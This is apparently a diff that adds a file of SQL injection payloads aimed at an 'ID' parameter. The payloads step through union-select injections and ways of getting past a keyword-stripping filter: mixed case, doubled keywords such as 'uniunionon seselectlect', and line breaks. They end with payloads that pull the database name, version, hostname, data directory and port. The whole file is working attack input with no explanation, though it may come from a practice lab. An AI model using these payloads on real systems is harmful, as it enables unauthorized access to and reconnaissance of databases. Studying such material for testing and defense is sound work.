@@ -1,0 +1,81 @@
+ID:1
+ID:1\
+ID:1' union select 1,2,3 -- 
+ID:1' Union select 1,2,3 -- 
+ID:1' UnIon select 1,2,3 -- 
+ID:1' uniunionon select 1,2,3 -- 
+ID:1' uniunionon seselectlect 1,2,3 -- 
+ID:1' uniunionon seselectlect 1,2,3
+ID:1' uniunionon seselectlect 1,2,3 #
+ID:1' uniunionon seselectlect 1,2,3
+--
+
+ID:1' uniunionon Select 1,2,3
+--
+
+ID:1' uniunionon all Select 1,2,3
+--
+
+ID:1' uniunionon  selSelectect 1,2,3
+--
+
+ID:1' uniunionon
+  selSelectect 1,2,3
+--
+
+ID:1' uniunionon
+  selSelectect
+ 1,2,3
+--
+
+ID:1' 
+uniunionon
+  selSelectect
+ 1,2,3
+--
+
+ID:1' 
+uniunionon
+  selSelectect
+ 1,2,3
+OR '1
+ID:-1' 
+uniunionon
+  selSelectect
+ 1,2,3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,2,3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ database(),2,3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,database(),3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,version(),3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,@@hostname,3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,@@datadir,3
+OR '1
+ID:99' 
+uniunionon
+  selSelectect
+ 1,@@port,3
+OR '1
